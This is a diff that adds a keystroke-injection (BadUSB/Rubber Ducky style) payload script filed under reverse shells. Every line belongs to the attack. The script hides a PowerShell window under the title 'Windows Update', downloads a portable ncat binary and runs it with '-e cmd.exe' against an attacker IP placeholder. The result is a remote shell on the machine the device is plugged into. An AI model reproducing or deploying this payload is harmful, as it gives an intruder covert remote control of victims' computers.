@@ -1,0 +1,36 @@
+REM Author: Baph0m3th
+REM Description: Downloads portable ncat binary and use it to connect back to the attacker's machine
+REM Version:	1.0
+REM Category:	Reverse Shells
+REM Timing: approx. 14 seconds to pop a Reverse Shell
+GUI R
+DELAY 500
+STRING PowerShell.exe -noe -c ". mode.com con: lines=1 cols=12"
+ENTER
+DELAY 500
+STRING $HOST.UI.RawUI.WindowTitle = "Windows Update"
+DELAY 950
+ENTER
+DELAY 950
+STRING mkdir C:\test
+ENTER
+DELAY 950
+STRING Invoke-WebRequest -Uri https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe -Outfile C:\test\ncat.exe
+DELAY 2000
+ENTER
+DELAY 950
+STRING cd C:\test
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 250
+GUI R
+DELAY 950
+STRING cmd.exe
+ENTER
+DELAY 950
+STRING C:/test/ncat.exe <Attacker_IP> <PORT> -e cmd.exe
+DELAY 2000
+ENTER
+WINDOWS DOWN
